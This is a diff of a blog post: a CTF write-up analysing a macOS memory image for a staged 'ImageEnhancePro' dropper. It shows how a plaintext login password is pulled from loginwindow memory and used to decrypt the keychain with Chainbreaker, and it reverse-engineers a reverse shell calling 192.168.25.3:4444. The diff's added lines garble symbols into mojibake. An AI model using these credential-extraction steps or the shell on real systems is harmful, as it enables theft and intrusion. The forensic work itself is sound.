@@ -8,12 +8,12 @@
     <meta property="og:title" content="s4nct1m0ny - macOS DFIR report" />
     <meta property="og:description" content="macOS memory forensics: ISF from kernel DWARF, loginwindow plaintext credential extraction, Chainbreaker 3DES keychain decryption, and full RE of a Swift dropper using machine Hardware UUID as decryption key." />
     <meta property="og:url" content="https://mooofin.github.io/portfolio/blog/s4nct1m0ny.html" />
-    <meta property="og:image" content="https://mooofin.github.io/portfolio/blog/photos-s4nct1m0ny/thumbnail.png" />
+    <meta property="og:image" content="https://mooofin.github.io/portfolio/blog/../images/posts/s4nct1m0ny/thumbnail.png" />
     <meta property="og:image:width" content="400" />
     <meta property="og:image:height" content="400" />
     <meta property="og:type" content="article" />
     <meta name="twitter:card" content="summary_large_image" />
-    <meta name="twitter:image" content="https://mooofin.github.io/portfolio/blog/photos-s4nct1m0ny/thumbnail.png" />
+    <meta name="twitter:image" content="https://mooofin.github.io/portfolio/blog/../images/posts/s4nct1m0ny/thumbnail.png" />
     <link rel="stylesheet" href="../style.css" />
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/styles/atom-one-light.min.css" />
     <link rel="icon" href="../public/favicon.ico" />
@@ -216,12 +216,12 @@
 
             <div class="blog-content">
 
-              <div class="ascii-art">░██████╗░░██╗██╗███╗░░██╗░█████╗░████████╗░░███╗░░███╗░░░███╗░█████╗░███╗░░██╗██╗░░░██╗
-██╔════╝░██╔╝██║████╗░██║██╔══██╗╚══██╔══╝░████║░░████╗░████║██╔══██╗████╗░██║╚██╗░██╔╝
-╚█████╗░██╔╝░██║██╔██╗██║██║░░╚═╝░░░██║░░░██╔██║░░██╔████╔██║██║░░██║██╔██╗██║░╚████╔╝░
-░╚═══██╗███████║██║╚████║██║░░██╗░░░██║░░░╚═╝██║░░██║╚██╔╝██║██║░░██║██║╚████║░░╚██╔╝░░
-██████╔╝╚════██║██║░╚███║╚█████╔╝░░░██║░░░███████╗██║░╚═╝░██║╚█████╔╝██║░╚███║░░░██║░░░
-╚═════╝░░░░░░╚═╝╚═╝░░╚══╝░╚════╝░░░░╚═╝░░░╚══════╝╚═╝░░░░░╚═╝░╚════╝░╚═╝░░╚══╝░░░╚═╝░░░</div>
+              <div class="ascii-art">â–‘â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—â–‘â–‘â–ˆâ–ˆâ•—â–ˆâ–ˆâ•—â–ˆâ–ˆâ–ˆâ•—â–‘â–‘â–ˆâ–ˆâ•—â–‘â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—â–‘â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—â–‘â–‘â–ˆâ–ˆâ–ˆâ•—â–‘â–‘â–ˆâ–ˆâ–ˆâ•—â–‘â–‘â–‘â–ˆâ–ˆâ–ˆâ•—â–‘â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—â–‘â–ˆâ–ˆâ–ˆâ•—â–‘â–‘â–ˆâ–ˆâ•—â–ˆâ–ˆâ•—â–‘â–‘â–‘â–ˆâ–ˆâ•—
+â–ˆâ–ˆâ•”â•â•â•â•â•â–‘â–ˆâ–ˆâ•”â•â–ˆâ–ˆâ•‘â–ˆâ–ˆâ–ˆâ–ˆâ•—â–‘â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•”â•â•â–ˆâ–ˆâ•—â•šâ•â•â–ˆâ–ˆâ•”â•â•â•â–‘â–ˆâ–ˆâ–ˆâ–ˆâ•‘â–‘â–‘â–ˆâ–ˆâ–ˆâ–ˆâ•—â–‘â–ˆâ–ˆâ–ˆâ–ˆâ•‘â–ˆâ–ˆâ•”â•â•â–ˆâ–ˆâ•—â–ˆâ–ˆâ–ˆâ–ˆâ•—â–‘â–ˆâ–ˆâ•‘â•šâ–ˆâ–ˆâ•—â–‘â–ˆâ–ˆâ•”â•
+â•šâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—â–‘â–ˆâ–ˆâ•”â•â–‘â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•”â–ˆâ–ˆâ•—â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•‘â–‘â–‘â•šâ•â•â–‘â–‘â–‘â–ˆâ–ˆâ•‘â–‘â–‘â–‘â–ˆâ–ˆâ•”â–ˆâ–ˆâ•‘â–‘â–‘â–ˆâ–ˆâ•”â–ˆâ–ˆâ–ˆâ–ˆâ•”â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•‘â–‘â–‘â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•”â–ˆâ–ˆâ•—â–ˆâ–ˆâ•‘â–‘â•šâ–ˆâ–ˆâ–ˆâ–ˆâ•”â•â–‘
+â–‘â•šâ•â•â•â–ˆâ–ˆâ•—â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•‘â–ˆâ–ˆâ•‘â•šâ–ˆâ–ˆâ–ˆâ–ˆâ•‘â–ˆâ–ˆâ•‘â–‘â–‘â–ˆâ–ˆâ•—â–‘â–‘â–‘â–ˆâ–ˆâ•‘â–‘â–‘â–‘â•šâ•â•â–ˆâ–ˆâ•‘â–‘â–‘â–ˆâ–ˆâ•‘â•šâ–ˆâ–ˆâ•”â•â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•‘â–‘â–‘â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•‘â•šâ–ˆâ–ˆâ–ˆâ–ˆâ•‘â–‘â–‘â•šâ–ˆâ–ˆâ•”â•â–‘â–‘
+â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•”â•â•šâ•â•â•â•â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•‘â–‘â•šâ–ˆâ–ˆâ–ˆâ•‘â•šâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•”â•â–‘â–‘â–‘â–ˆâ–ˆâ•‘â–‘â–‘â–‘â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—â–ˆâ–ˆâ•‘â–‘â•šâ•â•â–‘â–ˆâ–ˆâ•‘â•šâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•”â•â–ˆâ–ˆâ•‘â–‘â•šâ–ˆâ–ˆâ–ˆâ•‘â–‘â–‘â–‘â–ˆâ–ˆâ•‘â–‘â–‘â–‘
+â•šâ•â•â•â•â•â•â–‘â–‘â–‘â–‘â–‘â–‘â•šâ•â•â•šâ•â•â–‘â–‘â•šâ•â•â•â–‘â•šâ•â•â•â•â•â–‘â–‘â–‘â–‘â•šâ•â•â–‘â–‘â–‘â•šâ•â•â•â•â•â•â•â•šâ•â•â–‘â–‘â–‘â–‘â–‘â•šâ•â•â–‘â•šâ•â•â•â•â•â–‘â•šâ•â•â–‘â–‘â•šâ•â•â•â–‘â–‘â–‘â•šâ•â•â–‘â–‘â–‘</div>
 
               <h2>Background</h2>
               <p>Peter Parker, the Daily Bugle's star photographer and secretly Spider-Man, exposed Eddie Brock's fake Spider-Man photos, earning J. Jonah Jameson's praise. When Eddie begged for forgiveness, Peter snapped, "You want forgiveness? Get religion." Humiliated, Eddie - now bonded with Venom - plotted his revenge. Recently, Peter faced performance issues with his laptop and sent it in for service. Upon its return, he noticed something was off. His Spider-Sense tingled - someone had tampered with it. Help Peter analyse the compromised system.</p>
@@ -238,11 +238,11 @@
               <h3>Q1 - What is the OS version of the compromised system?</h3>
               <p><strong>Answer: macOS 10.11.6 El Capitan</strong></p>
               <div class="img-container">
-                <img src="photos-s4nct1m0ny/qsn1.png" alt="Volatility banners output" />
+                <img src="../images/posts/s4nct1m0ny/qsn1.png" alt="Volatility banners output" />
                 <p>Volatility banners output</p>
               </div>
               <div class="img-container">
-                <img src="photos-s4nct1m0ny/qsn1-2.png" alt="Apple Wiki kernel version table" />
+                <img src="../images/posts/s4nct1m0ny/qsn1-2.png" alt="Apple Wiki kernel version table" />
                 <p>Apple Wiki kernel version table</p>
               </div>
               <p>First thing - the <code>.raw</code> extension threw me off, i thought of using Autopsy and mac_apt failed to load it as a disk image because it isn't one and went back to dear volatility</p>
@@ -346,7 +346,7 @@ Volatility symbols path: ['...\volatility3-win-exes-2.28.0\symbols', ...]</code>
               <p>That showed <code>osxpmem</code> was used to capture the memory, but not the hostname directly. Used <code>mac_psenv</code> to read process environment variables - every process inherits <code>HOSTNAME</code> from the shell:</p>
               <pre><code>.\vol2\volatility_2.6_win64_standalone\volatility_2.6_win64_standalone.exe --plugins=vol2\plugins -f chall\chall.raw --profile=MacElCapitan_15G31x64 mac_psenv 2>&amp;1 | findstr "HOSTNAME"</code></pre>
               <div class="img-container">
-                <img src="photos-s4nct1m0ny/qsn2.png" alt="mac_psenv HOSTNAME output" />
+                <img src="../images/posts/s4nct1m0ny/qsn2.png" alt="mac_psenv HOSTNAME output" />
                 <p>mac_psenv HOSTNAME output</p>
               </div>
               <p><code>HOSTNAME=Mac-Admin.local</code> appears across multiple process environments. The <code>.local</code> suffix is macOS's Bonjour mDNS domain automatically appended to the computer name.</p>
@@ -360,7 +360,7 @@ Volatility symbols path: ['...\volatility3-win-exes-2.28.0\symbols', ...]</code>
               <h4>Step 1 - pstree and pslist came up empty</h4>
               <p>My first instinct was to look at running processes. <code>mac.pstree</code> and <code>mac.pslist</code> showed nothing (well this chall was not gonna be that easy ig) obviously malicious - just standard macOS daemons and a few user apps (Safari, TextEdit, Preview, Flock).</p>
               <div class="img-container">
-                <img src="photos-s4nct1m0ny/qsn3-1.png" alt="mac.pstree output" />
+                <img src="../images/posts/s4nct1m0ny/qsn3-1.png" alt="mac.pstree output" />
                 <p>mac.pstree output</p>
               </div>
 
@@ -375,7 +375,7 @@ cd Desktop
 sudo osxpmem.app/osxpmem -o OSXPMem/Memcap/mem.aff4</code></pre>
               <p>Interesting context (checking SIP status is classic attacker recon) but no direct reference to the malicious app.</p>
               <div class="img-container">
-                <img src="photos-s4nct1m0ny/qsn3-2.png" alt="mac.bash output" />
+                <img src="../images/posts/s4nct1m0ny/qsn3-2.png" alt="mac.bash output" />
                 <p>mac.bash output</p>
               </div>
 
@@ -383,7 +383,7 @@ sudo osxpmem.app/osxpmem -o OSXPMem/Memcap/mem.aff4</code></pre>
               <p>Since the app wasn't running, we checked what files were open on the system. We'll start with the Downloads folder:</p>
               <pre><code>.\volatility3-win-exes-2.28.0\vol.exe -f chall\chall.raw mac.lsof | findstr -i "download"</code></pre>
               <div class="img-container">
-                <img src="photos-s4nct1m0ny/qsn3.png" alt="lsof Downloads output" />
+                <img src="../images/posts/s4nct1m0ny/qsn3.png" alt="lsof Downloads output" />
                 <p>lsof Downloads output</p>
               </div>
               <p>That showed <code>/System/Users/admin/Downloads/ImageEnhancePro.app/Contents/MacOS/applet</code></p>
@@ -411,7 +411,7 @@ b'ImageEnhancePro.zip","size":98438,"id":"667148/ab3908f17491315471'</code></pre
                 <li><strong>Ran as PID 574</strong> - <code>ImageEnhancePro.app' [574]</code> ties it to the <code>applet</code> process we saw in pstree</li>
                 <li><strong>Accessed the keychain</strong> - <code>ImageEnhancePro/Users/admin/Library/Keychains/login.keychain</code> - it was going after saved credentials</li>
               </ul>
-              <p>Full infection chain: <strong>Flock message → <code>ImageEnhancePro.zip</code> download → extracted and ran AppleScript (<code>main.scpt</code>) → keychain access</strong></p>
+              <p>Full infection chain: <strong>Flock message â†’ <code>ImageEnhancePro.zip</code> download â†’ extracted and ran AppleScript (<code>main.scpt</code>) â†’ keychain access</strong></p>
               <p>Makes sense with the story too - Eddie Brock knew Peter is a photographer and sent him a fake "image enhancement" tool lol</p>
 
               <hr />
@@ -422,7 +422,7 @@ b'ImageEnhancePro.zip","size":98438,"id":"667148/ab3908f17491315471'</code></pre
               <p>Already surfaced in Q3. When we ran the strings search against memory we found:</p>
               <pre><code>b'ImageEnhancePro.zip","text":"","timestamp":"1749131547760","timestampInMillis":1749131547760,"uid":"1749131547760-z3v-m'</code></pre>
               <div class="img-container">
-                <img src="photos-s4nct1m0ny/qsn4.png" alt="Flock message JSON in memory" />
+                <img src="../images/posts/s4nct1m0ny/qsn4.png" alt="Flock message JSON in memory" />
                 <p>Flock message JSON in memory</p>
               </div>
               <p>This is Flock's internal message JSON format - <code>text</code>, <code>timestamp</code>, <code>timestampInMillis</code>, <code>uid</code> are all Flock message fields. The <code>ImageEnhancePro.zip</code> was shared as a file attachment in a Flock chat, which triggered the download.</p>
@@ -443,7 +443,7 @@ b'ImageEnhancePro.zip","size":98438,"id":"667148/ab3908f17491315471'</code></pre
 "name".Eddie Brock
 "ownerGuid".k47pkcc74p5lb5lk</code></pre>
               <div class="img-container">
-                <img src="photos-s4nct1m0ny/qsn5.png" alt="Flock contact record in memory showing Eddie Brock's email" />
+                <img src="../images/posts/s4nct1m0ny/qsn5.png" alt="Flock contact record in memory showing Eddie Brock's email" />
                 <p>Flock contact record in memory showing Eddie Brock's email</p>
               </div>
               <p>Eddie Brock's Flock account: JID <code>ezkzyseeykzbz6vy@go.to</code>, email <code>hecoj34842@eduhed.com</code>.</p>
@@ -470,7 +470,7 @@ You really need to get those photos to Jonah soon."</code></pre>
 "chatName"."Robbie R"
 "email"."jefoyil452@baxima.com"</code></pre>
               <div class="img-container">
-                <img src="photos-s4nct1m0ny/qsn6.png" alt="Robbie Robertson's Flock contact record in memory" />
+                <img src="../images/posts/s4nct1m0ny/qsn6.png" alt="Robbie Robertson's Flock contact record in memory" />
                 <p>Robbie Robertson's Flock contact record in memory</p>
               </div>
               <p>Okie so it explains the "Hello Peter! Jefoyil452 just joined Flock" notification we saw earlier - that was Robbie Robertson joining Peter's team, not Eddie Brock.</p>
@@ -484,7 +484,7 @@ You really need to get those photos to Jonah soon."</code></pre>
               <p>This one took me a lot of time, prolly the most time while solving this challenge. The instinct on seeing "login credentials" in a forensics challenge is to find a password hash and crack it. Well unlike Windows which uses NTLM, macOS stores user password hashes as PBKDF2-SALTED-SHA512 - computationally expensive to brute-force.</p>
               <p>So it began. I started searching for CVEs related to macOS authentication for around 3 hours straight, but found nothing. Well what if it wasn't a CVE though? Since the kernel version is 2016-based i tried looking for blogs. Finally i asked chatgpt to search everywhere for password authentication, DFIR, login issues for any PDFs detailing some forensics stuff and it gave me a lot of articles to go through... (not limited to US defence department) uhm</p>
               <div class="img-container">
-                <img src="photos-s4nct1m0ny/meme-1.png" alt="meme" />
+                <img src="../images/posts/s4nct1m0ny/meme-1.png" alt="meme" />
               </div>
               <p><strong>References I read:</strong></p>
               <ul>
@@ -508,14 +508,14 @@ You really need to get those photos to Jonah soon."</code></pre>
               </ul>
               <p>This struct is constructed in <code>loginwindow</code>'s heap memory and passed to the OS authentication layer. When authentication succeeds, the OS gives loginwindow back a token saying "this user is verified."</p>
               <div class="img-container">
-                <img src="photos-s4nct1m0ny/qsn7-1.png" alt="NPS paper on macOS memory forensics" />
+                <img src="../images/posts/s4nct1m0ny/qsn7-1.png" alt="NPS paper on macOS memory forensics" />
                 <p>NPS paper on macOS memory forensics</p>
               </div>
               <p>BUT one of the papers said an interesting thing about loginwindow, something unbelievable - <strong>loginwindow never zeroes out that struct after auth completes.</strong> It just keeps it sitting in the heap for the entire duration of the session. There's no <code>memset(password_buffer, 0, len)</code> call, no <code>SecureZeroMemory</code> lol. This sounded too crazy to be true bc this is a basic secure coding practice that's been understood since the 1980s - <code>passwd(1)</code> on Unix zeroed credentials after use decades ago.</p>
               <p>The researchers were using a hex editor called <strong>iBored</strong> to manually inspect memory captures and noticed: every single dump had the user's plaintext password sitting in memory, consistently located near the string <code>longname</code>.</p>
               <p>Since we have a full RAM capture taken mid-session, those credentials are in memory exactly as they were at login time hopefully, but this was the only related lead i could find. No way this works right??</p>
               <div class="img-container">
-                <img src="photos-s4nct1m0ny/meme-2.gif" alt="meme-2" />
+                <img src="../images/posts/s4nct1m0ny/meme-2.gif" alt="meme-2" />
               </div>
 
               <h4>Extracting the password</h4>
@@ -526,15 +526,15 @@ hits = list(re.finditer(b'longname', data))
 print(f'Total: {len(hits)}')
 for i, m in enumerate(hits):
     print(f'#{i+1} @ {m.start()}:', ''.join(chr(b) if 32&lt;=b&lt;127 else '.' for b in data[m.start():m.start()+400]))</code></pre>
-              <p>Total hits: <strong>10</strong>. Hits 1–8 are code segment strings. Hit <strong>#9</strong> at offset <code>5809601040</code> is the live auth struct in the heap:</p>
+              <p>Total hits: <strong>10</strong>. Hits 1â€“8 are code segment strings. Hit <strong>#9</strong> at offset <code>5809601040</code> is the live auth struct in the heap:</p>
               <pre><code>longname........Admin............password........!_L0v3_U%3000</code></pre>
               <div class="img-container">
-                <img src="photos-s4nct1m0ny/qsn7.png" alt="longname hit #9 showing plaintext password in memory" />
+                <img src="../images/posts/s4nct1m0ny/qsn7.png" alt="longname hit #9 showing plaintext password in memory" />
                 <p>longname hit #9 showing plaintext password in memory</p>
               </div>
               <ul>
-                <li><code>longname</code> → <code>Admin</code></li>
-                <li><code>password</code> → <code>!_L0v3_U%3000</code></li>
+                <li><code>longname</code> â†’ <code>Admin</code></li>
+                <li><code>password</code> â†’ <code>!_L0v3_U%3000</code></li>
               </ul>
 
               <hr />
@@ -549,19 +549,19 @@ for i, m in enumerate(hits):
               <pre><code>/Users/admin/Library/Keychains/login.keychain</code></pre>
               <p>The login keychain is automatically unlocked when the user logs in, using the same password as the account. It stays unlocked for the entire session - which is why iCloud credentials are accessible without re-entering anything once you're logged in.</p>
               <div class="img-container">
-                <img src="photos-s4nct1m0ny/qsn8.png" alt="macOS Keychain wiki - login.keychain stores iCloud credentials" />
+                <img src="../images/posts/s4nct1m0ny/qsn8.png" alt="macOS Keychain wiki - login.keychain stores iCloud credentials" />
                 <p>macOS Keychain wiki - login.keychain stores iCloud credentials</p>
               </div>
               <p>The <code>.keychain</code> file itself is a <code>SecKeychainItem</code> database encrypted with a key derived from the user's login password. If you just copy the file off a disk image and try to open it on another machine, the decryption key is tied to the specific account and system.</p>
               <p>The obvious forensic question is: can we read the keychain on a non-macOS system? Searching for tools to open keychain files without macOS came up empty. Most answers online said it's impossible without the originating system.</p>
               <div class="img-container">
-                <img src="photos-s4nct1m0ny/qsn8-1.png" alt="Searching for keychain decryption on non-macOS" />
+                <img src="../images/posts/s4nct1m0ny/qsn8-1.png" alt="Searching for keychain decryption on non-macOS" />
                 <p>Searching for keychain decryption on non-macOS</p>
               </div>
               <p>The thought then was: could we dump the decrypted keychain data from memory, the same way we extracted the plaintext password from loginwindow? The <code>securityd</code> daemon holds unlocked keychain data in memory.</p>
               <p>I was gonna give up on this then i searched it again with DFIR and boom the AI that gaslit me gave me exactly what i needed!</p>
               <div class="img-container">
-                <img src="photos-s4nct1m0ny/qsn8-3.png" alt="Chainbreaker found via DFIR search" />
+                <img src="../images/posts/s4nct1m0ny/qsn8-3.png" alt="Chainbreaker found via DFIR search" />
                 <p>Chainbreaker found via DFIR search</p>
               </div>
               <p><strong><a href="https://github.com/n0fate/chainbreaker">Chainbreaker</a></strong> - a Python tool that parses and decrypts macOS keychain files given the unlock password.</p>
@@ -586,7 +586,7 @@ for i, m in enumerate(hits):
               <p>Since the login keychain is encrypted with the same password as the user account (which we recovered in Q7), we already have the key:</p>
               <pre><code>python -m chainbreaker --dump-all --password "!_L0v3_U%3000" extracted\kc_dump\login.keychain</code></pre>
               <div class="img-container">
-                <img src="photos-s4nct1m0ny/qsn8-4.png" alt="Chainbreaker output showing iCloud credentials" />
+                <img src="../images/posts/s4nct1m0ny/qsn8-4.png" alt="Chainbreaker output showing iCloud credentials" />
                 <p>Chainbreaker output showing iCloud credentials</p>
               </div>
               <pre><code>[+] Generic Password Record
@@ -703,7 +703,7 @@ SSGP Label   : ed0de6b1805158208ad272a7ec57f727</code></pre>
 0xffffff802bb712d0  /Users/admin/Downloads/ImageEnhancePro.app/Contents/Resources/preview</code></pre>
               <p>The executable registered with macOS is <code>applet</code> - the standard AppleScript runtime binary. But the actual payload is two levels deep: <code>main.scpt</code> is the compiled AppleScript, and it in turn executes <code>preview</code>, a binary bundled in <code>Contents/Resources/</code>.</p>
               <div class="img-container">
-                <img src="photos-s4nct1m0ny/qsn9.png" alt="mac_list_files output showing ImageEnhancePro files" />
+                <img src="../images/posts/s4nct1m0ny/qsn9.png" alt="mac_list_files output showing ImageEnhancePro files" />
                 <p>mac_list_files output showing ImageEnhancePro files</p>
               </div>
 
@@ -711,12 +711,12 @@ SSGP Label   : ed0de6b1805158208ad272a7ec57f727</code></pre>
               <pre><code>vol2 mac_dump_file -q 0xffffff802bb763c0 -O extracted\main.scpt
 # Wrote 1494 bytes</code></pre>
               <div class="img-container">
-                <img src="photos-s4nct1m0ny/qsn9-1.png" alt="main.scpt dump" />
+                <img src="../images/posts/s4nct1m0ny/qsn9-1.png" alt="main.scpt dump" />
                 <p>main.scpt dump</p>
               </div>
               <p>Decompiling the <code>.scpt</code> with Script Editor reveals the full attack chain:</p>
               <div class="img-container">
-                <img src="photos-s4nct1m0ny/qsn9-2.png" alt="main.scpt decompiled" />
+                <img src="../images/posts/s4nct1m0ny/qsn9-2.png" alt="main.scpt decompiled" />
                 <p>main.scpt decompiled in Script Editor</p>
               </div>
               <pre><code class="language-applescript">-- 1. Show Flash update dialog
@@ -733,13 +733,13 @@ SSGP Label   : ed0de6b1805158208ad272a7ec57f727</code></pre>
               <pre><code>vol2 mac_dump_file -q 0xffffff802bb712d0 -O extracted\preview
 # Wrote 101388 bytes</code></pre>
               <div class="img-container">
-                <img src="photos-s4nct1m0ny/qsn9-3.png" alt="preview dump" />
+                <img src="../images/posts/s4nct1m0ny/qsn9-3.png" alt="preview dump" />
                 <p>preview dump</p>
               </div>
               <pre><code>certutil -hashfile extracted\preview SHA256
 # 45b098a1208cf63c8ad0beab32ab6d2f9ff2dbf05b6d88382acde55170fcf559</code></pre>
               <div class="img-container">
-                <img src="photos-s4nct1m0ny/qsn9-4.png" alt="SHA256 of preview" />
+                <img src="../images/posts/s4nct1m0ny/qsn9-4.png" alt="SHA256 of preview" />
                 <p>SHA256 of preview</p>
               </div>
               <p><strong>Answer: <code>preview_45b098a1208cf63c8ad0beab32ab6d2f9ff2dbf05b6d88382acde55170fcf559</code></strong></p>
@@ -753,7 +753,7 @@ SSGP Label   : ed0de6b1805158208ad272a7ec57f727</code></pre>
               <h4>Large encrypted blob in .rodata</h4>
               <p>The first thing that stands out is a massive encrypted string sitting in the binary's read-only data section. Been done too many challs to know that this is a runtime-decrypted payload but obfuscated ofc. Let's go through the main functions one by one.</p>
               <div class="img-container">
-                <img src="photos-s4nct1m0ny/qsn10-1.png" alt="IDA - large encrypted blob in preview" />
+                <img src="../images/posts/s4nct1m0ny/qsn10-1.png" alt="IDA - large encrypted blob in preview" />
                 <p>IDA - large encrypted blob in preview</p>
               </div>
 
@@ -811,7 +811,7 @@ SSGP Label   : ed0de6b1805158208ad272a7ec57f727</code></pre>
 
               <h4>Anti-analysis gate 1 - <code>sub_100005420</code>: ptrace anti-debug</h4>
               <div class="img-container">
-                <img src="photos-s4nct1m0ny/qsn10-2.png" alt="sub_100005420 - ptrace anti-debug" />
+                <img src="../images/posts/s4nct1m0ny/qsn10-2.png" alt="sub_100005420 - ptrace anti-debug" />
                 <p>sub_100005420 - ptrace anti-debug</p>
               </div>
               <p>Classic macOS <code>ptrace(PT_DENY_ATTACH, 0, 0, 0)</code>. If ptrace returns anything other than -1 (0xffffffff) a debugger is not attached and execution continues. Any debugger attempting to attach after this call is killed by the kernel. In <code>main</code> the result is XOR'd with <code>0xff</code> - failure calls <code>_exit(1)</code> immediately.</p>
@@ -928,7 +928,7 @@ SSGP Label   : ed0de6b1805158208ad272a7ec57f727</code></pre>
 
               <h4>XOR decoder - <code>sub_100002210</code>: key = <code>gh057_kn1gh7</code></h4>
               <div class="img-container">
-                <img src="photos-s4nct1m0ny/qsn10-3.png" alt="sub_100002210 - XOR decoder graph view" />
+                <img src="../images/posts/s4nct1m0ny/qsn10-3.png" alt="sub_100002210 - XOR decoder graph view" />
                 <p>sub_100002210 - XOR decoder graph view</p>
               </div>
               <pre><code class="language-c">int64_t sub_100002210(int64_t arg1, int64_t arg2, int64_t arg3)
@@ -1013,7 +1013,7 @@ SSGP Label   : ed0de6b1805158208ad272a7ec57f727</code></pre>
   --plugins=vol2\plugins -f chall\chall.raw \
   --profile=MacElCapitan_15G31x64 mac_list_files 2>&amp;1 | findstr "updatesvc"</code></pre>
               <div class="img-container">
-                <img src="photos-s4nct1m0ny/qsn10-4.png" alt="mac_list_files - updatesvc vnode" />
+                <img src="../images/posts/s4nct1m0ny/qsn10-4.png" alt="mac_list_files - updatesvc vnode" />
                 <p>mac_list_files - updatesvc vnode</p>
               </div>
               <pre><code>0xffffff802867c780  /private/tmp/com.apple.updatesvc</code></pre>
@@ -1022,7 +1022,7 @@ SSGP Label   : ed0de6b1805158208ad272a7ec57f727</code></pre>
   --plugins=vol2\plugins -f chall\chall.raw \
   --profile=MacElCapitan_15G31x64 mac_dump_file -q 0xffffff802867c780 -O extracted\updatesvc</code></pre>
               <div class="img-container">
-                <img src="photos-s4nct1m0ny/qsn10-5.png" alt="mac_dump_file - 17204 bytes written" />
+                <img src="../images/posts/s4nct1m0ny/qsn10-5.png" alt="mac_dump_file - 17204 bytes written" />
                 <p>mac_dump_file - 17204 bytes written</p>
               </div>
               <pre><code>Volatility Foundation Volatility Framework 2.6
@@ -1031,7 +1031,7 @@ Wrote 17204 bytes to extracted\updatesvc from vnode at address ffffff802867c780<
 
               <h4>Stage-2 analysis in Cutter (R2)</h4>
               <div class="img-container">
-                <img src="photos-s4nct1m0ny/qsn10-6.png" alt="updatesvc loaded in Cutter - function list and strings" />
+                <img src="../images/posts/s4nct1m0ny/qsn10-6.png" alt="updatesvc loaded in Cutter - function list and strings" />
                 <p>updatesvc loaded in Cutter - function list and strings</p>
               </div>
               <p>Loaded <code>extracted\updatesvc</code> in Cutter (radare2 GUI). Native Mach-O x86-64 binary. Function list (<code>afl</code>):</p>
@@ -1047,7 +1047,7 @@ Wrote 17204 bytes to extracted\updatesvc from vnode at address ffffff802867c780<
 0x100000f9d    1 8086         fcn.100000f9d</code></pre>
               <p><code>fcn.100000f9d</code> (8086 bytes) is the decrypted shellcode payload written into executable memory by <code>main</code> via <code>mmap</code>.</p>
               <div class="img-container">
-                <img src="photos-s4nct1m0ny/qsn10-7.png" alt="Cutter strings panel - /bin/sh and system paths visible" />
+                <img src="../images/posts/s4nct1m0ny/qsn10-7.png" alt="Cutter strings panel - /bin/sh and system paths visible" />
                 <p>Cutter strings panel - /bin/sh and system paths visible</p>
               </div>
               <p>Strings (<code>iz</code>):</p>
@@ -1059,7 +1059,7 @@ Wrote 17204 bytes to extracted\updatesvc from vnode at address ffffff802867c780<
               <h4>Shellcode disassembly - the reverse shell</h4>
               <p><code>main</code> allocates RWX memory with <code>mmap</code>, copies the shellcode from <code>__TEXT.__cstring</code> into it, then jumps. Cutter's disassembly of the shellcode section starting at <code>0x100000f28</code>:</p>
               <div class="img-container">
-                <img src="photos-s4nct1m0ny/10-9.png" alt="Cutter - shellcode disassembly overview" />
+                <img src="../images/posts/s4nct1m0ny/10-9.png" alt="Cutter - shellcode disassembly overview" />
                 <p>Cutter - shellcode disassembly overview</p>
               </div>
               <pre><code class="language-asm">0x100000f28  mov eax, 0x2000061    ; macOS BSD syscall: socket
@@ -1110,22 +1110,22 @@ Wrote 17204 bytes to extracted\updatesvc from vnode at address ffffff802867c780<
 
               <h4>Raw bytes confirm IP and port</h4>
               <div class="img-container">
-                <img src="photos-s4nct1m0ny/qsn10-8.png" alt="Raw hex dump - sockaddr_in bytes highlighted" />
+                <img src="../images/posts/s4nct1m0ny/qsn10-8.png" alt="Raw hex dump - sockaddr_in bytes highlighted" />
                 <p>Raw hex dump - sockaddr_in bytes highlighted</p>
               </div>
               <div class="img-container">
-                <img src="photos-s4nct1m0ny/10-10.png" alt="Cutter - pd 20 and hex bytes around connect" />
+                <img src="../images/posts/s4nct1m0ny/10-10.png" alt="Cutter - pd 20 and hex bytes around connect" />
                 <p>Cutter - pd 20 and hex bytes around connect</p>
               </div>
               <p>Raw bytes at <code>0x100000f47</code>:</p>
               <pre><code>48 be 02 00 11 5c c0 a8 19 03
-│    │  └──┬──┘ └──┬──┘ └────┬────┘
-│    │   AF_INET  port      IP addr
-│    │    = 2    = 4444   192.168.25.3
-└────┘
+â”‚    â”‚  â””â”€â”€â”¬â”€â”€â”˜ â””â”€â”€â”¬â”€â”€â”˜ â””â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”˜
+â”‚    â”‚   AF_INET  port      IP addr
+â”‚    â”‚    = 2    = 4444   192.168.25.3
+â””â”€â”€â”€â”€â”˜
 movabs rsi, imm64  (REX.W + BE + 8-byte immediate)</code></pre>
               <p><strong>C2 = <code>192.168.25.3:4444</code></strong></p>
-              <p>The shellcode is a reverse shell: <code>socket → connect(192.168.25.3:4444) → dup2(sock,stdout) → dup2(sock,stdin) → execve("/bin/sh")</code>. rawdogged the packet inspection</p>
+              <p>The shellcode is a reverse shell: <code>socket â†’ connect(192.168.25.3:4444) â†’ dup2(sock,stdout) â†’ dup2(sock,stdin) â†’ execve("/bin/sh")</code>. rawdogged the packet inspection</p>
 
               <hr />
 
@@ -1142,7 +1142,7 @@ movabs rsi, imm64  (REX.W + BE + 8-byte immediate)</code></pre>
   --plugins=vol2\plugins -f chall\chall.raw \
   --profile=MacElCapitan_15G31x64 mac_list_files 2>&amp;1 | findstr "Keychains"</code></pre>
               <div class="img-container">
-                <img src="photos-s4nct1m0ny/qsn11.png" alt="mac_list_files Keychains directory - Hardware UUID visible in path" />
